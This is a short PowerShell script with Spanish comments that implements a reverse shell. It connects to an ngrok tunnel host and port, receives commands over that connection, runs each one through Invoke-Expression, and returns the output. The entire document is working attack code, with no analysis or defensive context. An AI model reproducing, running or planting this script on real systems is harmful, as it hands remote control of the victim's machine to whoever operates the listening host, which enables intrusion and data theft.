$LHOST = "4.tcp.us-cal-1.ngrok.io"
$LPORT = 19534

try {
    # Crear objeto TCPClient
    $tcpClient = New-Object Net.Sockets.TCPClient
    $tcpClient.Connect($LHOST, $LPORT)

    if (-not $tcpClient.Connected) {
        Write-Host "No se pudo conectar al host ${LHOST}:${LPORT}"
        exit
    }

    Write-Host "Conexión establecida con ${LHOST}:${LPORT}"

    # Configurar streams
    $stream = $tcpClient.GetStream()
    $reader = New-Object IO.StreamReader($stream)
    $writer = New-Object IO.StreamWriter($stream)
    $writer.AutoFlush = $true
    $buffer = New-Object Byte[] 1024

    while ($tcpClient.Connected) {
        try {
            while ($stream.DataAvailable) {
                $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
                $command = ([Text.Encoding]::UTF8).GetString($buffer, 0, $bytesRead).Trim()

                if ($command.Length -gt 0) {
                    Write-Host "Comando recibido: $command"
                    $output = try { Invoke-Expression $command 2>&1 } catch { $_ }
                    $writer.WriteLine($output)
                }
            }
        } catch {
            Write-Host "Error durante la comunicación: $_"
            break
        }
    }
} catch {
    Write-Host "Error al conectar: $_"
} finally {
    if ($tcpClient -and $tcpClient.Connected) {
        $stream.Close()
        $reader.Close()
        $writer.Close()
        $tcpClient.Close()
        Write-Host "Conexión cerrada."
    }
}
